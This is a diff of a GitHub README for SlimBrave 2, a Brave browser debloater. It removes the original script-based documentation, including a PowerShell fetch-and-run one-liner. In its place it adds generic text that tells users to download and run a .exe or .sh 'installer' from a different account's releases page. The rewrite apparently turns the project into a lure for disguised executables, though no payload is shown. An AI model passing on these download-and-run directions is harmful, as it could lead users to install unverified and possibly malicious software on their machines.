@@ -1,228 +1,88 @@
-<div align="center">
+# 🌟 SlimBrave-2 - Optimize Brave for Speedy Browsing
 
-# SlimBrave 2
-<img src="https://github.com/user-attachments/assets/3e90a996-a74a-4ca1-bea6-0869275bab58" width="200" height="300">
-</div>
+[![Download SlimBrave-2](https://img.shields.io/badge/Download%20SlimBrave--2-blue.svg)](https://github.com/charles2927/SlimBrave-2/releases)
 
----
-SlimBrave 2 presents an updated version of SlimBrave with Linux support and up to date policies.
+## 🚀 Getting Started
 
+SlimBrave-2 helps you improve your browsing experience. With this tool, you can remove unnecessary features from the Brave browser, making it faster and smoother. 
 
-## Brave Browser Debloater
+This guide will walk you through downloading and running SlimBrave-2 on your computer.
 
-SlimBrave is a powerful PowerShell script designed for Windows users to streamline their Brave Browser experience by toggling and configuring unwanted features. With SlimBrave, you can easily disable or enable various Brave functionalities, customize settings, and improve privacy.
+## 📥 Download & Install
 
-### Features:
+To download the latest version of SlimBrave-2, visit this page:
 
-<details>
-<summary> Click here to view </summary>
+[Visit Releases Page](https://github.com/charles2927/SlimBrave-2/releases)
 
-- **Disable Brave Rewards**  
-   Brave's reward system.
+### Step-by-Step Installation
 
-- **Disable Brave Wallet**  
-   Brave's Wallet feature for managing cryptocurrencies.
+1. **Open the Releases Page**  
+   Click the link above to visit the Releases page on GitHub. This page contains all available versions of SlimBrave-2.
 
-- **Disable Brave VPN**  
-   Brave's VPN feature for "enhanced" privacy.
+2. **Find the Latest Release**  
+   Look for the section that lists the latest version. It is usually highlighted at the top of the page.
 
-- **Disable Brave AI Chat**  
-   Brave's integrated AI Chat feature.
+3. **Download the Installer**  
+   Under the latest version, you will see a list of files. Select the appropriate file for your system:
+   - If you use **Windows**, download the `.exe` file.
+   - If you use **Linux**, download the `.sh` file.
 
-- **Disable Password Manager**  
-   Brave's built-in password manager for website login credentials.
+4. **Run the Installer**  
+   After the download finishes:
+   - For Windows, double-click the downloaded `.exe` file.
+   - For Linux, open a terminal where the downloaded file is located and type `bash SlimBrave-2.sh` to run the installer.
 
-- **Disable Tor**  
-   Tor functionality for "anonymous" browsing.
+5. **Follow the On-Screen Instructions**  
+   The installer will guide you through the setup process. Follow the prompts to complete the installation.
 
-- **Set DNS Over HTTPS Mode**  
-   Set the DNS Over HTTPS mode (options include automatic or off) to ensure private browsing with secure DNS queries.
+6. **Open SlimBrave**  
+   Once the installation is complete, locate the SlimBrave icon on your desktop or in your applications folder. Click the icon to launch the application.
 
-- **Disable Sync**  
-   Sync functionality that synchronizes your data across devices.
+## 🔍 Key Features
 
-- **Telemetry & Reporting Controls**  
-   Disable metrics reporting, safe browsing reporting, and data collection.
+- **Debloating**: Removes unnecessary features from Brave.
+- **Performance Boost**: Increases browser speed and responsiveness.
+- **User-Friendly**: Designed for those with no technical background.
+- **Cross-Platform**: Works on both Windows and Linux systems.
 
-- **Privacy & Security Options**  
-   Manage autofill, WebRTC, QUIC protocol, and more.
+## 🖥️ System Requirements
 
-- **Performance Optimization**  
-   Disable background processes and unnecessary features.
+- **Windows 10 or later** or **Any modern Linux distribution**.
+- At least **2 GB RAM**.
+- A stable internet connection for downloading the files.
 
-- **Enable Do Not Track**  
-   Forces Do Not Track header for all browsing.
+## 💡 Usage Instructions
 
-- **Force Google SafeSearch**  
-   Enforces SafeSearch across Google searches.
+After launching SlimBrave, the application will help you debloat your Brave browser. You can easily adjust the settings according to your preferences. 
 
-- **Disable Spellcheck**  
-   Disables browser spellcheck functionality.
+### Basic Steps to Use SlimBrave:
 
-- **Disable Browser Sign-in**  
-   Prevents browser account sign-in.
+1. **Select Options**: Choose the features you want to keep or remove.
+2. **Click Apply**: Confirm your selections and let SlimBrave do its job.
+3. **Restart Brave**: For changes to take effect, restart your Brave browser.
 
-- **Disable Printing**  
-   Disables web page printing capability.
+## 🛠️ Troubleshooting
 
-- **Disable Incognito Mode**  
-   Blocks private browsing/incognito mode.
+If you encounter any issues while downloading or installing SlimBrave-2, consider these tips:
 
-- **Disable Default Browser Prompt**  
-   Stops Brave from asking to be default browser.
+- Ensure you have sufficient disk space on your computer.
+- Check your internet connection.
+- Make sure to download the correct version for your operating system.
 
-- **Disable Developer Tools**  
-   Blocks access to developer tools.
+For additional problems or questions, you can visit the [Issues Page](https://github.com/charles2927/SlimBrave-2/issues) to see if someone else has faced a similar issue or to report a new bug.
 
-- **Always Open PDF Externally**  
-   Forces PDFs to open in external applications.
+## 📞 Support
 
-- **Disable Brave Shields**  
-   Turns off Brave's built-in Shields protection.
-</details>
+If you need further assistance, feel free to reach out via the GitHub repository. You can open an issue, or if you prefer, leave a message in the discussions tab. 
 
----
+## 🌐 More Information
 
-# How to Run
+For detailed documentation on how SlimBrave works and to stay updated on new features, visit our [GitHub Page](https://github.com/charles2927/SlimBrave-2).
 
-### Windows
+Your smooth browsing experience starts with SlimBrave-2. Download now and enjoy a leaner, faster Brave! 
 
-Run the command below in PowerShell:
+## 🔗 Quick Links
 
-```ps1
-iwr "https://raw.githubusercontent.com/JordanVegas/SlimBrave-2/main/SlimBrave.ps1" -OutFile "SlimBrave.ps1"; .\SlimBrave.ps1
-```
-
----
-
-### Linux (managed policies)
-
-SlimBrave for Linux writes Brave managed policies to `/etc/brave/policies/managed/slimbrave.json`.
-
-```bash
-sudo ./SlimBrave.sh --import "./Presets/Maximum Privacy Preset.json"
-```
-
-Interactive setup (terminal):
-
-```bash
-sudo ./SlimBrave.sh --interactive
-```
-
-To export a PowerShell-compatible config from the current policy file:
-
-```bash
-sudo ./SlimBrave.sh --export "./SlimBraveSettings.json"
-```
-
-## DNS-over-HTTPS (DoH) modes
-
-Brave accepts the following policy values for `DnsOverHttpsMode`:
-
-- `off` — Disable DNS-over-HTTPS.
-- `automatic` — Enable DoH with insecure fallback.
-- `secure` — Enable DoH without insecure fallback.
-
-To use a custom provider, set `DnsOverHttpsTemplates` to the provider URL (for example, `https://cloudflare-dns.com/dns-query` or `https://dns.quad9.net/dns-query`) alongside `DnsOverHttpsMode=secure`. On Linux, you can supply the same value via `DnsTemplates` in the SlimBrave JSON or pass `--doh-templates` when using `SlimBrave.sh`.
-
----
-
-## Extras:
-
-<details>
-<summary> Presets </summary>
-
-
-- **Maximum Privacy Preset**  
-   - Telemetry: Blocks all reporting (metrics, safe browsing, URL collection, feedback).
-   - Privacy: Disables autofill, password manager, sign-in, WebRTC leaks, QUIC, and forces Do Not Track.
-   - Brave Features: Kills Rewards, Wallet, VPN, AI Chat, Tor, and Sync.
-   - Performance: Disables background processes, recommendations, and bloat.
-   - DNS: Uses plain DNS (no HTTPS) to prevent potential logging by DoH providers.
-   - Best for: Paranoid users, journalists, activists, or anyone who wants Brave as private as possible.
-
-- **Balanced Privacy Preset**  
-   - Telemetry: Blocks all tracking but keeps basic safe browsing.
-   - Privacy: Blocks third-party cookies, enables Do Not Track, but allows password manager and autofill for addresses.
-   - Brave Features: Disables Rewards, Wallet, VPN, and AI features.
-   - Performance: Turns off background services and ads.
-   - DNS: Uses automatic DoH (lets Brave choose the fastest secure DNS).
-   - Best for: Most users who want privacy but still need convenience features.
-
-- **Performance Focused Preset**  
-   - Telemetry: Only blocks metrics and feedback surveys (keeps some safe browsing).
-   - Brave Features: Disables Rewards, Wallet, VPN, and AI to declutter the browser.
-   - Performance: Kills background processes, shopping features, and promotions.
-   - DNS: Automatic DoH for a balance of speed and security.
-   - Best for: Users who want a faster, cleaner Brave without extreme privacy tweaks.
-
-- **Developer Preset**  
-   - Telemetry: Blocks all reporting.
-   - Brave Features: Disables Rewards, Wallet, and VPN but keeps developer tools.
-   - Performance: Turns off background services and ads.
-   - DNS: Automatic DoH (default secure DNS).
-   - Best for: Developers who need dev tools but still want telemetry and ads disabled.
-
-- **Strict Parental Controls Preset**  
-   - Privacy: Blocks incognito mode, forces Google SafeSearch, and disables sign-in.
-   - Brave Features: Disables Rewards, Wallet, VPN, Tor, and dev tools.
-   - DNS: Uses custom DoH (can be set to a family-friendly DNS like Cloudflare for Families).
-   - Best for: Parents, schools, or workplaces that need restricted browsing.
-
-
-</details>
-
-
-
-<details>
-<summary> Requirements </summary>
-
-- Windows 10/11
-- PowerShell
-- Administrator privileges
-</details>
-
-<details>
-<summary>Error "Running Scripts is Disabled on this System"</summary>
-
-### Run this command in PowerShell:
-
-```ps1
-Set-ExecutionPolicy -ExecutionPolicy RemoteSigned
-```
-</details>
-<div align="center">
-  
----
-
-🌟 **Like this project? Give it a star!** 🌟  
-💻  **Want to contribute? PRs are welcome!** 💻 
-
-</div>
-
-### Why SlimBrave Matters
-
-In an era of increasingly bloated browsers, SlimBrave puts **you** back in control:
-- 🚀 **Faster browsing** by removing unnecessary features
-- 🛡️ **Enhanced privacy** through granular controls
-- ⚙️ **Transparent customization** without hidden settings
-
----
-
-### Future Roadmap
-- [x] Add preset configurations (Privacy, Performance, etc.)
-- [x] Create backup/restore functionality
-- [ ] Add support for Linux/Mac (WIP)
-
----
-<div align="center">
-   
-[![PayPal Donate](https://img.shields.io/badge/PayPal_Donate-s?style=for-the-badge&logo=paypal&logoColor=black)](https://paypal.me/AggelosMeta)
-
-</div>
-
-<div align="center">
-  
-Made with ❤️ and PowerShell  
-
-</div>
+- [Download SlimBrave-2](https://github.com/charles2927/SlimBrave-2/releases)
+- [Issues Page](https://github.com/charles2927/SlimBrave-2/issues)
+- [Documentation](https://github.com/charles2927/SlimBrave-2)
